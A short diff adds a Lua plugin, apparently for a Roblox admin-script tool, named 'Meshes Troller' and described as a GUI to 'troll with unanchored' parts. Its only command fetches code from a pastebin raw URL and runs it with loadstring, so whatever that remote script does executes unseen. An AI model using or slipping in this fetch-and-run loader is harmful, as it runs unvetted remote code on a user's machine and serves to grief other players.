@@ -1,0 +1,15 @@
+local Plugin = {
+	["PluginName"] = "Meshes Troller",
+	["PluginDescription"] = "Opens a GUI, troll with unanchored",
+	["Commands"] = {
+		["MeshesTroller"] = {
+			["Description"] = "Opens the GUI",
+			["Aliases"] = {'MT', 'Meshes', 'Troller'},
+			["Function"] = function(args,speaker)
+				 loadstring(game:HttpGet("https://pastebin.com/raw/r90nXjg7"))()
+			end,
+		},
+	},
+}
+
+return Plugin
